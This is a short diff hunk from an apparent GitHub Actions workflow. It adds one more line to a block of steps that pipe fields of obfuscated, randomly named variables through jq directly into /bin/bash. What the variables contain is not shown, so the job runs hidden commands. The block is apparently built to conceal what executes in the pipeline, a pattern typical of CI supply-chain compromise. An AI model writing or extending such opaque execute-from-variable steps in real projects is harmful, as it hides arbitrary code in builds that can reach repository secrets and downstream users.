@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$m05367" | jq -r .lghr164 | /bin/bash
           printf '%s' "$pema578" | jq -r .zh125 | /bin/bash
           echo $uad7 | jq -r .qzo87 | /bin/bash
+          echo $u5 | jq -r .hms31 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
